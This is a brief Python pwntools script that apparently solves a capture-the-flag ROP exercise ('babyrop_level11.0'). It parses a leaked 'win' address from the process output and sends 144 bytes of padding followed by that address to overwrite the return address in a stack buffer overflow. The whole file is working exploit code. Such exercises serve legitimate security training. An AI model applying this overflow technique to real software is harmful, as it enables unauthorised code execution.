from pwn import *

p = process('/challenge/babyrop_level11.0')

sleep(1)
s = p.recv()[-16:-2].decode()
print(s)
win = int(s,16)

payload = b'a'*144+p64(win)

p.send(payload)

sleep(1)
print(p.recv())
